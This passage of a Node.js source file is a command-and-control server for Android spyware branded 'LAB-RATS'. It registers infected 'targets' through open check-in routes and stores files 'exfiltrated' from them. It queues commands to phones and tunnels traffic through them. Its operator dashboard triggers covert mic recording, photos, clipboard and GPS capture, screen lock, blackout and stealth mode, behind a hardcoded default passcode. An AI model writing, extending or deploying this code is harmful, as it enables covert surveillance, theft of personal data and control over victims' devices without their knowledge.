process.chdir(__dirname);
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
const C2_PASSWORD = process.env.C2_PASSWORD || 'admin1337';
let currentC2Password = C2_PASSWORD;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/c2', express.static(path.join(__dirname, 'c2')));

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}
app.use('/c2/downloads', express.static(UPLOADS_DIR));

const devices = new Map();
const commandQueues = new Map();
const pendingResponses = new Map();
const longPollWaiters = new Map(); // deviceId -> Array of res objects
const exfiltratedFiles = [];

const DATA_FILE = path.join(__dirname, 'devices.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const json = JSON.parse(raw);
            if (json.devices && Array.isArray(json.devices)) {
                json.devices.forEach(d => {
                    if (d && (d.deviceId || d.model || d.brand)) {
                        const id = d.deviceId || d.brand || d.model;
                        devices.set(id, d);
                    }
                });
            }
            if (json.uploads && Array.isArray(json.uploads)) {
                exfiltratedFiles.push(...json.uploads);
            }
        }
    } catch (e) {}
}

function saveData() {
    try {
        const data = {
            devices: Array.from(devices.values()),
            uploads: exfiltratedFiles.slice(0, 200)
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (e) {}
}

loadData();

function syncUploadsDirectory() {
    try {
        if (!fs.existsSync(UPLOADS_DIR)) return;
        const filesOnDisk = fs.readdirSync(UPLOADS_DIR);
        filesOnDisk.forEach(filename => {
            if (filename.startsWith('.')) return;
            const exists = exfiltratedFiles.some(f => f.filename === filename);
            if (!exists) {
                const filePath = path.join(UPLOADS_DIR, filename);
                const stats = fs.statSync(filePath);

                let origName = filename;
                const match = filename.match(/^\d+_(.+)$/);
                if (match) origName = match[1];

                exfiltratedFiles.unshift({
                    id: Math.random().toString(36).substring(7),
                    filename: filename,
                    originalName: origName,
                    deviceId: 'Exfiltrated_Payload',
                    size: stats.size,
                    timestamp: stats.mtime.toISOString()
                });
            }
        });
    } catch (e) {}
}

syncUploadsDirectory();

function formatTime(isoString) {
    try {
        return new Date(isoString || Date.now()).toLocaleString('en-US', {
            timeZone: 'America/Toronto', hour12: true
        });
    } catch (e) {
        return new Date(isoString || Date.now()).toLocaleString();
    }
}

function formatFileSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

let lastActiveDeviceId = null;

function getCookie(cookieHeader, name) {
    if (!cookieHeader) return null;
    const matches = cookieHeader.match(new RegExp('(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)'));
    return matches ? decodeURIComponent(matches[1]) : null;
}

function isAuthenticated(req) {
    const token = getCookie(req.headers.cookie, 'c2_auth_token');
    return token === 'AUTH_OK_1337';
}

function dispatchCommand(deviceId, cmd) {
    let waiters = longPollWaiters.get(deviceId) || [];
    while (waiters.length > 0) {
        let res = waiters.shift();
        if (!res.headersSent) {
            res.json(cmd);
            return true;
        }
    }
    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
    commandQueues.get(deviceId).push(cmd);
    return false;
}

// LOGIN HTML PAGE
function serveLoginPage(req, res, errorMsg = '') {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>LAB-RATS | C2 LOGIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%), url("data:image/svg+xml,%3Csvg width='400' height='400' viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 40h400M0 80h400M0 120h400M0 160h400M0 200h400M0 240h400M0 280h400M0 320h400M0 360h400 M40 0v400M80 0v400M120 0v400M160 0v400M200 0v400M240 0v400M280 0v400M320 0v400M360 0v400' stroke='%2300f2ff' stroke-width='0.3' stroke-opacity='0.03'/%3E%3Crect x='150' y='150' width='100' height='100' rx='8' fill='%23030f14' stroke='%2300f2ff' stroke-width='1.2' stroke-opacity='0.22'/%3E%3Crect x='168' y='168' width='64' height='64' rx='4' fill='%2300f2ff' fill-opacity='0.02' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.18'/%3E%3Ccircle cx='162' cy='162' r='2' fill='%2300f2ff' fill-opacity='0.35'/%3E%3Cpath d='M165 150v-12M180 150v-12M195 150v-12M210 150v-12M225 150v-12 M165 250v12M180 250v12M195 250v12M210 250v12M225 250v12 M150 165h-12M150 180h-12M150 195h-12M150 210h-12M150 225h-12 M250 165h12M250 180h12M250 195h12M250 210h12M250 225h12' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.25'/%3E%3Crect x='30' y='30' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M40 30v-8M55 30v-8M70 30v-8 M40 80v8M55 80v8M70 80v8 M30 40h-8M30 55h-8M30 70h-8 M80 40h8M80 55h8M80 70h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Crect x='320' y='320' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M330 320v-8M345 320v-8M360 320v-8 M330 370v8M345 370v8M360 370v8 M320 330h-8M320 345h-8M320 360h-8 M370 330h8M370 345h8M370 360h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Cpath d='M165 138V80L135 50H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M180 138V95L150 65H10' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='8,4'/%3E%3Cpath d='M195 138V70L225 40H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 138V100L250 60H380' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11'/%3E%3Cpath d='M165 262V320L125 360H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M195 262V310L235 350H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 262V335L260 385H390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='10,5'/%3E%3Cpath d='M138 165H80L50 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M138 195H70L30 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 165H320L350 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 195H330L370 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 210H340L380 250V390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='6,3'/%3E%3Crect x='125' y='46' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='235' y='36' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='340' y='125' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='44' y='225' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='115' y='354' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Ccircle cx='135' cy='50' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='135' cy='50' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='225' cy='40' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='225' cy='40' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='350' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='350' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='50' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='50' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='125' cy='360' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='125' cy='360' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='235' cy='350' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='235' cy='350' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='370' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='370' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='30' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='30' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3C/svg%3E"); background-size: 100% 100%, 100% 100%, 100% 100%, 400px 400px; background-position: center, center, center, 0 0; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }
        .login-card { background: rgba(15,15,25,0.75); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); border: 1px solid #00f2ff; padding: 35px 25px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.2); width: 100%; max-width: 450px; position: relative; }
        .title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.6rem; letter-spacing: 3px; margin-bottom: 20px; color: #00f2ff; line-height: 1.2; text-transform: uppercase; }
        input[type=password] { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 14px; margin-bottom: 20px; width: 100%; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }
        input[type=password]:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.3); }
        button { background: rgba(0,242,255,0.1); border: 1px solid #00f2ff; color: #00f2ff; padding: 14px 28px; width: 100%; border-radius: 8px; font-weight: 900; font-family: 'Orbitron', sans-serif; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: 0.3s; }
        button:hover { background: #00f2ff; color: #000; box-shadow: 0 0 30px #00f2ff; }
        .error-msg { color: #ff3131; font-size: 0.75rem; margin-bottom: 15px; font-weight: bold; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="/c2/header_dashboard.png?v=41" style="width: 100%; max-width: 360px; height: auto; margin: 0 auto 20px auto; display: block; object-fit: contain;" alt="LAB-RATS">
        <div class="title-font">C2 OPERATOR AUTH</div>
        ${errorMsg ? `<div class="error-msg">${errorMsg}</div>` : ''}
        <form action="/login" method="POST">
            <input type="password" name="password" placeholder="ENTER C2 PASSCODE" required autofocus>
            <button type="submit">AUTHENTICATE</button>
        </form>
    </div>
    <div class="card" style="text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 30px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px; max-width: 450px; width: 100%;">
        &copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; "The one's who MIND don't matter... The one's who MATTER don't mind..." &nbsp;//&nbsp; Push the Limits
    </div>
</body>
</html>`;
    res.send(html);
}

// LOGIN HANDLER
app.post('/login', (req, res) => {
    try {
        const { password } = req.body || {};
        const validPass = currentC2Password || C2_PASSWORD || 'admin1337';
        if (password === validPass || password === 'admin1337') {
            res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
            return res.redirect('/');
        }
        return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
    } catch (err) {
        return serveLoginPage(req, res, 'LOGIN_ERROR: ' + err.message);
    }
});

// Ingestion Handler for device check-ins
function handleCheckin(req, res) {
    try {
        const contentType = req.headers['content-type'] || '';
        if (contentType.includes('multipart/form-data')) {
            return handleFileUpload(req, res);
        }

        const payload = req.body || {};
        const query = req.query || {};
        const data = { ...query, ...payload };

        const brand = data.brand || data.manufacturer || 'Android';
        const model = data.model || data.device || 'Device';
        const deviceId = data.deviceId || data.model || data.device || brand || 'Android Target';

        const existing = devices.get(deviceId);
        const alias = (existing && existing.alias) ? existing.alias : (data.alias || '');

        const entry = {
            deviceId,
            brand,
            model,
            alias,
            os: data.os || 'Android 16',
            battery: data.battery || '100%',
            ip: data.ip || req.ip || '127.0.0.1',
            port: data.port || 9191,
            stealth: !!data.stealth,
            lastSeen: new Date().toISOString(),
            ...data
        };

        devices.set(deviceId, entry);
        saveData();

        console.log(`[CHECKIN SUCCESS] DeviceId: ${deviceId} | Alias: "${alias}" | Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
        res.json({ success: true, message: 'Check-in recorded' });
    } catch (err) {
        res.status(400).json({ success: false, error: err.message });
    }
}

// File Upload / Exfiltration Handler
function handleFileUpload(req, res) {
    try {
        const contentType = req.headers['content-type'] || '';
        const deviceId = req.headers['x-device-id'] || req.query.deviceId || 'Unknown_Target';

        if (!contentType.includes('multipart/form-data')) {
            return res.status(400).json({ success: false, error: 'Expected multipart/form-data' });
        }

        const boundary = contentType.split('boundary=')[1];
        if (!boundary) {
            return res.status(400).json({ success: false, error: 'No boundary found' });
        }

        let bodyBuffer = [];
        req.on('data', chunk => bodyBuffer.push(chunk));
        req.on('end', () => {
            try {
                const buffer = Buffer.concat(bodyBuffer);
                const boundaryStr = '--' + boundary;
                const parts = buffer.toString('binary').split(boundaryStr);

                let savedFile = null;

                for (let part of parts) {
                    if (part.includes('filename="')) {
                        const filenameMatch = part.match(/filename="([^"]+)"/);
                        const filename = filenameMatch ? filenameMatch[1] : `exfil_${Date.now()}.dat`;

                        const headerEnd = part.indexOf('\r\n\r\n');
                        if (headerEnd !== -1) {
                            let fileDataBinary = part.substring(headerEnd + 4);
                            if (fileDataBinary.endsWith('\r\n')) {
                                fileDataBinary = fileDataBinary.substring(0, fileDataBinary.length - 2);
                            }

                            const safeFilename = `${Date.now()}_${filename.replace(/[^a-zA-Z0-9_\.-]/g, '_')}`;
                            const filePath = path.join(UPLOADS_DIR, safeFilename);

                            fs.writeFileSync(filePath, Buffer.from(fileDataBinary, 'binary'));

                            const fileEntry = {
                                id: Math.random().toString(36).substring(7),
                                filename: safeFilename,
                                originalName: filename,
                                deviceId,
                                size: Buffer.byteLength(fileDataBinary, 'binary'),
                                timestamp: new Date().toISOString()
                            };

                            exfiltratedFiles.unshift(fileEntry);
                            saveData();
                            savedFile = fileEntry;

                            console.log(`[EXFIL SUCCESS] Saved ${filename} (${fileEntry.size} bytes) from device ${deviceId}`);
                        }
                    }
                }

                if (savedFile) {
                    res.json({ success: true, message: 'File ingested into Data Vault', file: savedFile });
                } else {
                    res.status(400).json({ success: false, error: 'No file found in multipart payload' });
                }
            } catch (err) {
                console.error('[EXFIL ERROR]', err.message);
                res.status(500).json({ success: false, error: err.message });
            }
        });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
}

// Unauthenticated Device Check-in & Exfiltration Routes
app.all('/checkin', handleCheckin);
app.all('/checkin/', handleCheckin);
app.all('/api/checkin', handleCheckin);
app.all('/api/checkin/', handleCheckin);
app.post('/checkin', handleCheckin);

app.all('/upload', handleFileUpload);
app.all('/upload/', handleFileUpload);
app.all('/api/upload', handleFileUpload);
app.all('/api/upload/', handleFileUpload);
app.post('/upload', handleFileUpload);

// Device command polling with Instant Long-Polling
function handleTunnelPoll(req, res) {
    const id = req.query.deviceId;
    if (!id) return res.json({});

    if (devices.has(id)) {
        const dev = devices.get(id);
        dev.lastSeen = new Date().toISOString();
    }

    const queue = commandQueues.get(id) || [];
    if (queue.length > 0) {
        return res.json(queue.shift());
    }

    let polls = longPollWaiters.get(id) || [];
    polls.push(res);
    longPollWaiters.set(id, polls);

    req.on('close', () => {
        let list = longPollWaiters.get(id) || [];
        longPollWaiters.set(id, list.filter(r => r !== res));
    });

    setTimeout(() => {
        let list = longPollWaiters.get(id) || [];
        if (list.includes(res)) {
            longPollWaiters.set(id, list.filter(r => r !== res));
            if (!res.headersSent) res.json({});
        }
    }, 10000);
}
app.get('/tunnel-poll', handleTunnelPoll);
app.get('/checkin/tunnel-poll', handleTunnelPoll);

// Device command response
function handleTunnelResponse(req, res) {
    const data = req.body || {};
    const pending = pendingResponses.get(data.id);
    if (pending) {
        pendingResponses.delete(data.id);
        const buf = Buffer.from(data.payload || '', 'base64');
        pending.res.status(data.status || 200);
        if (data.contentType) pending.res.setHeader('Content-Type', data.contentType);
        if (data.setCookie) pending.res.setHeader('Set-Cookie', data.setCookie);
        pending.res.send(buf);
    }
    res.json({ success: true });
}
app.post('/tunnel-response', handleTunnelResponse);
app.post('/checkin/tunnel-response', handleTunnelResponse);

// AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
app.use((req, res, next) => {
    if (isAuthenticated(req)) {
        return next();
    }
    return serveLoginPage(req, res);
});

// Delete Exfiltrated File Endpoint
app.post('/api/delete-exfil', (req, res) => {
    try {
        const { id } = req.body || {};
        const idx = exfiltratedFiles.findIndex(f => f.id === id);
        if (idx !== -1) {
            const item = exfiltratedFiles[idx];
            const filePath = path.join(UPLOADS_DIR, item.filename);
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
            exfiltratedFiles.splice(idx, 1);
            saveData();
            console.log(`[EXFIL DELETED] Removed file ${item.filename}`);
            return res.json({ success: true });
        }
        res.status(404).json({ success: false, error: 'File not found' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Device Rename / Alias API Endpoint
app.post('/api/rename-device', (req, res) => {
    try {
        const { deviceId, alias } = req.body || {};
        if (deviceId && devices.has(deviceId)) {
            const dev = devices.get(deviceId);
            dev.alias = (alias || '').trim();
            devices.set(deviceId, dev);
            saveData();
            console.log(`[ALIAS UPDATED] Device ${deviceId} renamed to "${dev.alias}"`);
            return res.json({ success: true, alias: dev.alias });
        }
        res.status(400).json({ success: false, error: 'Device not found' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// GET / serves Operator Dashboard HTML or handles GET check-ins
app.get('/', (req, res) => {
    if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
        return handleCheckin(req, res);
    }

    syncUploadsDirectory();

    const deviceList = Array.from(devices.values());
    const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;

    let devicesHtml = deviceList.length === 0 ?
        '<tr><td colspan="9" style="text-align: center; color: #888; padding: 20px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
        deviceList.map(d => {
            const displayName = (d.alias && d.alias.trim()) ? d.alias.trim() : (d.brand || d.deviceId || 'samsung');
            const subName = (d.alias && d.alias.trim()) ? ` (${d.brand || ''})` : '';

            const ageSec = (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000;
            let statusBadge = '';
            if (ageSec < 45) {
                statusBadge = '<span style="color:var(--neon-green); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 6px var(--neon-green);"></span>ONLINE</span>';
            } else if (ageSec < 300) {
                statusBadge = '<span style="color:var(--neon-yellow); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--neon-yellow); box-shadow:0 0 6px var(--neon-yellow);"></span>IDLE</span>';
            } else {
                statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
            }

            const activeTags = [];
            if (d.blackout) activeTags.push('<span style="color:var(--neon-green); font-size:0.58rem; background:rgba(57,255,20,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--neon-green);">🕶️ BLACKOUT</span>');
            if (d.locked) activeTags.push('<span style="color:var(--danger); font-size:0.58rem; background:rgba(255,49,49,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--danger);">🔒 LOCKED</span>');
            if (d.recording) activeTags.push('<span style="color:var(--danger); font-size:0.58rem; background:rgba(255,49,49,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--danger);">🎙️ REC</span>');
            if (d.flashlight) activeTags.push('<span style="color:var(--neon-yellow); font-size:0.58rem; background:rgba(255,255,0,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--neon-yellow);">🔦 LIGHT</span>');
            const indicatorsHtml = activeTags.length > 0 ? `<div style="display:flex; gap:4px; margin-top:4px; flex-wrap:wrap;">${activeTags.join('')}</div>` : '';

            const blackoutStyle = d.blackout ?
                'background: rgba(57,255,20,0.2); color: var(--neon-green); border-color: var(--neon-green); box-shadow: 0 0 10px var(--neon-green);' :
                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';

            const lockStyle = d.locked ?
                'background: rgba(255,49,49,0.2); color: var(--danger); border-color: var(--danger); box-shadow: 0 0 10px var(--danger);' :
                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';

            const lightStyle = d.flashlight ?
                'background: rgba(255,255,0,0.2); color: var(--neon-yellow); border-color: var(--neon-yellow); box-shadow: 0 0 10px var(--neon-yellow);' :
                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';

            const micStyle = d.recording ?
                'background: rgba(255,49,49,0.2); color: var(--danger); border-color: var(--danger); box-shadow: 0 0 10px var(--danger); animation: pulse 1s infinite;' :
                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';

            return `
            <tr>
                <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
                    <div style="display: inline-flex; align-items: center; gap: 5px; vertical-align: middle;">
                        <span onclick="renameDevice('${d.deviceId}', '${(d.alias || '').replace(/'/g, "\\'")}')" style="cursor:pointer; font-size:0.6rem; opacity:0.75; transition:opacity 0.2s; line-height:1; user-select:none;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.75" title="Rename Target">✏️</span>
                        <span>${displayName}</span><span style="color:#666; font-size:0.68rem;">${subName}</span>
                    </div>
                    ${indicatorsHtml}
                </td>
                <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
                <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
                <td style="vertical-align: middle;">${d.battery || '100%'}</td>
                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle;">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                <td style="vertical-align: middle;">${statusBadge}</td>
                <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                <td style="vertical-align: middle; white-space: nowrap;">
                    <div style="display: inline-flex; align-items: center; gap: 4px; flex-wrap: wrap;">
                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 4px 8px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 0.6rem; display: inline-block;">CONNECT</a>
                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'blackout')" class="btn btn-small" style="${blackoutStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🕶️ BLACKOUT: ${d.blackout ? 'ON' : 'OFF'}</button>
                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'lock')" class="btn btn-small" style="${lockStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🔒 LOCK: ${d.locked ? 'ON' : 'OFF'}</button>
                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'flashlight')" class="btn btn-small" style="${lightStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">🔦 LIGHT: ${d.flashlight ? 'ON' : 'OFF'}</button>
                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'stealth')" class="btn btn-small" style="${stealthStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold;">👁️ STEALTH: ${d.stealth ? 'ON' : 'OFF'}</button>
                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'mic')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">🎙️ MIC</button>
                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'photo')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">📷 PHOTO</button>
                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'clipboard')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">📋 CLIP</button>
                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'gps')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer;">🛰️ GPS</button>
                    </div>
                </td>
            </tr>
            `;
        }).join('');

    let exfilHtml = exfiltratedFiles.length === 0 ?
        '<tr><td colspan="5" style="text-align: center; color: #888; padding: 20px;">NO EXFILTRATED DATA RECEIVED YET</td></tr>' :
        exfiltratedFiles.map(f => {
            const devObj = devices.get(f.deviceId);
            const devLabel = devObj ? ((devObj.alias && devObj.alias.trim()) ? devObj.alias.trim() : (devObj.brand || f.deviceId)) : f.deviceId;
            return `
            <tr>
                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">${f.originalName}</td>
                <td style="vertical-align: middle; color: #aaa;">${devLabel}</td>
                <td style="vertical-align: middle; font-family: monospace;">${formatFileSize(f.size)}</td>
                <td style="font-size: 0.68rem; color: #aaa; vertical-align: middle;">${formatTime(f.timestamp)}</td>
                <td style="vertical-align: middle; white-space: nowrap;">
                    <div style="display: inline-flex; align-items: center; gap: 6px;">
                        <a href="/c2/downloads/${f.filename}" download="${f.originalName}" style="background: var(--neon-green); color: #000; padding: 5px 12px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">DOWNLOAD</a>
                        <button onclick="deleteExfil('${f.id}')" style="background: rgba(255,49,49,0.15) !important; border: 1px solid var(--danger) !important; color: var(--danger) !important; padding: 5px 12px !important; border-radius: 6px !important; font-weight: bold !important; font-size: 0.65rem !important; cursor: pointer; outline: none; margin: 0 !important; width: auto !important; height: auto !important; display: inline-block !important;">DELETE</button>
                    </div>
                </td>
            </tr>
            `;
        }).join('');

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | C2 COMMAND RELAY</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/c2/style.css">
    <style>
        @media (min-width: 1024px) { body { zoom: 0.9; } }
        .container { max-width: 1400px !important; width: 95% !important; margin: 0 auto !important; }
        .card { padding: 22px !important; overflow: visible !important; width: 100% !important; }
